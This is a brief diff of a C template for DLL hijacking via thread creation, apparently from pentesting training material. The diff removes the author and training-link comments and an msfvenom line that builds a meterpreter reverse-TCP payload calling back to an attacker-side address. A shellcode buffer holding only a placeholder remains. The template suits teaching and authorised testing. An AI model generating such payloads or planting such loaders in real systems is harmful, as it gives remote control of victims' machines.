@@ -1,15 +1,7 @@
-//   Dll Hijacking via Thread Creation 
-// Author - Vivek Ramachandran 
-//  Learn Pentesting Online --  http://PentesterAcademy.com/topics and http://SecurityTube-Training.com 
-// Free Infosec Videos --  http://SecurityTube.net 
-
-
-
 #include <windows.h>
 #define SHELLCODELEN	1024	
 
 
-// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.10 LPORT=9000 -f c 
 
 unsigned char shellcode[SHELLCODELEN] = 
 "YOUR SHELLCODE";
